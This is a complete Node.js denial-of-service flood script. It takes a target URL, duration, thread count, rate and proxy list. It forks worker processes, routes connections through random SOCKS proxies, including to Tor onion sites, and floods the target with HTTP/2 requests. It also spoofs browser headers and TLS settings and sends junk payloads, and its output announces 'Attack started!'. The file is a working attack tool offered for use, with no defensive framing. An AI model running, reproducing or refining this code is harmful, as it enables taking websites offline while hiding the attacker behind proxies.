const url = require('url');
const fs = require('fs');
const colors = require('colors');
const cluster = require('cluster');
const requests = require('request');
const argv = require('minimist')(process.argv.slice(2));
const EventEmitter = require('events')
const emitter = new EventEmitter();
const crypto = require("crypto");
const { SocksClient } = require('socks')
const events = require('events')
const tls = require('tls')
const dns = require('dns')
const http2 = require('http2')
const { PassThrough } = require('stream');
const JSStreamSocket = (new tls.TLSSocket(new PassThrough()))._handle._parentWrap.constructor;

emitter.setMaxListeners(Number.POSITIVE_INFINITY);
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
events.defaultMaxListeners = 0

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

const urlT = process.argv[2];
const timeT = process.argv[3];
const threadsT = process.argv[4];
const rateT = process.argv[5];
const proxyT = process.argv[6];

const debug = argv["debug"] || 'false';

if (process.argv.length < 6) {
    console.log(`\n[${'x'.red}] Usage: ${'TARGET TIME THREADS RATE PROXY'.red} ${'--debug=<>'.grey}`)
    console.log(`[${'*'.blue}] Example: ${'http://site.ru 60 15 80 proxy.txt'.blue}\n`)
    console.log(`[${'!'.yellow}] For TOR targets need tor proxies (not default socks)\n`)
    process.exit(0)
}

try {
    fs.readFileSync(proxyT, 'utf-8').toString().replace(/\r/g, '').split('\n');
} catch (e) {
    console.log(`\n[${'x'.red}] Proxy file not found!\n`)
    process.exit(0)
}

if (debug == 'true') {
    process.on('uncaughtException', function (error) { console.log(error) });
    process.on('unhandledRejection', function (error) { console.log(error) })
} else {
    process.on('uncaughtException', function (error) { });
    process.on('unhandledRejection', function (error) { })
}


if (cluster.isPrimary) {
    console.log(`[${'*'.green}] Attack started!` + ` < ${urlT} >`.gray)

    if (debug == 'true') {
        console.log(`[${'!'.yellow}] Debug mode enabled!`)
    }

    for (let i = 0; i < threadsT; i++) {
        cluster.fork();
    }
    cluster.on('exit', (worker, code, signal) => { });
} else {
    main();
}

var parsed = new URL(urlT);

var headers = {};

headers[":method"] = "GET";
headers[":authority"] = parsed.host;
headers[":path"] = parsed.path;
headers[":scheme"] = "https";
headers["accept-language"] = 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3';
headers["accept-encoding"] = 'gzip, deflate, br';
headers["upgrade-insecure-requests"] = "1";
headers["accept"] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
headers["TE"] = 'trailers';
headers["user-agent"] = 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0';
headers["sec-fetch-dest"] = 'navigate';
headers["sec-fetch-mode"] = "document";
headers["sec-fetch-user"] = "?1";
headers["sec-fetch-site"] = "none";

const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const ciphers = `TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384`;
const sigalgs = `ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512`;
this.ecdhCurve = `GREASE:x25519:secp256r1:secp384r1`;
this.sigalgss = sigalgs;

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: this.sigalgss,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: "TLS_client_method",
};

const secureContext = tls.createSecureContext(secureContextOptions);


function generateTorFingerprint() {
    const currentDate = new Date().toISOString();
    const randomBytes = crypto.randomBytes(16);
    const hashInput = currentDate + randomBytes.toString('hex');
    const fingerprint = crypto.createHash('sha256').update(hashInput).digest('hex');
    return fingerprint;
}


function main() {
    function flood() {
        const url = new URL(urlT);

        let ip = null

        if (urlT.indexOf(".onion") != -1) {
            ip = url.hostname
        } else {
            setInterval(() => {
                dns.lookup(url.hostname, 4, (err, address, family) => {
                    ip = address
                })
            }, 1000)
        }

        var proxies = fs.readFileSync(proxyT, 'utf-8').toString().replace(/\r/g, '').split('\n');
        setInterval(() => {
            var parts = proxies[Math.floor(Math.random() * proxies.length)];
            parts = parts.split(':');

            if (ip == null)
                return;

            const options = {
                proxy: {
                    host: parts[0],
                    port: Number(parts[1]),
                    type: 4
                },

                command: 'connect',

                destination: {
                    host: ip,
                    port: url.port == '' ? (url.protocol == 'https:' ? 443 : 80) : Number(url.port)
                }
            };

            SocksClient.createConnection(options, (err, info) => {
                if (err) {
                    return
                }

                function sendRequest(socket) {

                    http2.connect(`http://${url.host}${url.pathname}`, {
                        createConnection: () => socket,
                        settings: {
                            headerTableSize: 65536,
                            maxConcurrentStreams: 10000,
                            initialWindowSize: 6291456,
                            maxHeaderListSize: 65536,
                            enablePush: false
                        }
                    }, (session) => {
                        setInterval(() => {
                            for (let i = 0; i < rateT; i++) {

                                socket.send('﷽﷽﷽'.repeat(5000))

                                const request = session.request(headers)
                                request.end().on('response', (response) => { })
                            }
                        }, 5000)
                    }).on('error', () => { })
                }

                const genFP = generateTorFingerprint()

                if (url.protocol == 'https:') {
                    const socket = tls.connect({
                        rejectUnauthorized: false,
                        servername: url.hostname,
                        honorCipherOrder: false,
                        requestCert: true,
                        socket: new JSStreamSocket(info.socket),
                        secure: true,
                        sigals: sigalgs,
                        // socket: connection,
                        ciphers: ciphers,
                        ALPNProtocols: ['h2', 'http/1.1'],
                        secureContext: secureContext,
                        ecdhCurve: "GREASE:x25519:secp256r1:secp384r1",
                        host: url.host,
                        rejectUnauthorized: false,
                        servername: url.hostname,
                        //secureProtocol: "TLS_method",
                        secureProtocol: ["TLSv1_2_method", "TLSv1_3_method",],
                        allowHTTP1: true,
                        fingerprint: genFP,
                    }, () => {
                        sendRequest(socket)
                    })
                } else {
                    sendRequest(info.socket)
                }
            })
        })

    }
    setInterval(flood);
    setTimeout(function () {
        process.exit()
    }, timeT * 1000);
}

